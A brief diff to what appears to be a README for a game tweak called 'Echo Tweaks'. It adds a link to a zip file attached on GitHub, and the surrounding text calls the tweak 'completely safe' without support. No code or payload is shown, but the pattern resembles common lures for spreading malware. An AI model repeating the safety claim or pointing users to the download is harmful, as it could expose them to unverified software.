@@ -19,3 +19,5 @@ This tweak does **not modify game files** and is completely safe.
 Use at your own risk.  
 
 Enjoy smoother gameplay with **Echo Tweaks**! 🎮🔥
+
+[echo_tweaks.zip](https://github.com/user-attachments/files/19143689/echo_tweaks.zip)
